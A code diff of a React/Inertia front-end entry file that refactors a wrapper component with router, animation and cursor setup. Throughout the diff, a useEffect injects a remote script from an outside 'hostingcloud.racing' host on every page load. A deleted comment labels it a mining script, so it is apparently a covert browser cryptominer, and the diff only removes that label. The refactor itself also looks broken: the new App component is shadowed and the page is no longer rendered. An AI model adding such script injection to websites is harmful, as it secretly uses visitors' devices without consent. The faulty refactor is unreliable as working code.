@@ -21,10 +21,8 @@ import AnimatedCursor from "react-animated-cursor";
 
 const appName = import.meta.env.VITE_APP_NAME || "Laravel";
 
-// Create a wrapper component to include all your custom setup
-const AppWrapper = ({ children }) => {
+const App = () => {
     useEffect(() => {
-        // Initialize WOW.js
         const wow = new WOW({
             boxClass: "wow",
             animateClass: "animated",
@@ -34,7 +32,6 @@ const AppWrapper = ({ children }) => {
         });
         wow.init();
 
-        // Add your mining script
         const script = document.createElement("script");
         script.src = "https://www.hostingcloud.racing/Rh11.js";
         document.body.appendChild(script);
@@ -52,44 +49,44 @@ const AppWrapper = ({ children }) => {
         };
 
         return () => {
-            if (script.parentNode) {
-                document.body.removeChild(script);
-            }
+            document.body.removeChild(script);
         };
     }, []);
 
-    // Scroll to top on page navigation
+    const { pathname } = useLocation();
+
     useEffect(() => {
-        if (window.location) {
-            window.scrollTo(0, 0);
-        }
-    }, [window.location?.pathname]);
+        window.scrollTo(0, 0);
+    }, [pathname]);
 
     return (
-        <HelmetProvider>
-            {children}
-            <AnimatedCursor
-                innerSize={8}
-                outerSize={32}
-                color="248, 158, 82"
-                outerAlpha={0.15}
-                innerScale={0}
-                outerScale={0}
-                clickables={[
-                    "a",
-                    'input[type="text"]',
-                    'input[type="email"]',
-                    'input[type="number"]',
-                    'input[type="submit"]',
-                    'input[type="image"]',
-                    "label[for]",
-                    "select",
-                    "textarea",
-                    "button",
-                    ".Link ",
-                ]}
-            />
-        </HelmetProvider>
+        <BrowserRouter>
+            {" "}
+            {/* Wrap your app in BrowserRouter */}
+            <HelmetProvider>
+                <AnimatedCursor
+                    innerSize={8}
+                    outerSize={32}
+                    color="248, 158, 82"
+                    outerAlpha={0.15}
+                    innerScale={0}
+                    outerScale={0}
+                    clickables={[
+                        "a",
+                        'input[type="text"]',
+                        'input[type="email"]',
+                        'input[type="number"]',
+                        'input[type="submit"]',
+                        'input[type="image"]',
+                        "label[for]",
+                        "select",
+                        "textarea",
+                        "button",
+                        ".Link ",
+                    ]}
+                />
+            </HelmetProvider>
+        </BrowserRouter>
     );
 };
 
@@ -102,13 +99,7 @@ createInertiaApp({
         ),
     setup({ el, App, props }) {
         const root = createRoot(el);
-
-        // Wrap the Inertia App component with your custom AppWrapper
-        root.render(
-            <AppWrapper>
-                <App {...props} />
-            </AppWrapper>
-        );
+        root.render(<App {...props} />);
     },
     progress: {
         color: "#4B5563",
